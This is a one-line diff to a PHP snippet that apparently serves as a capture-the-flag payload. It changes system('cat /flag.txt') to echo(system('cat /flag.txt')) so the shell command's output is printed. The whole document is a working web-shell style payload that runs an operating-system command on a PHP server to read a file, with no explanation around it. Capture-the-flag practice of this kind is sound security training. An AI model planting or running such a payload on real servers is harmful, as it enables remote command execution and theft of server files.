@@ -1,1 +1,1 @@
-<?php system('cat /flag.txt'); ?>
+<?php echo(system('cat /flag.txt')); ?>
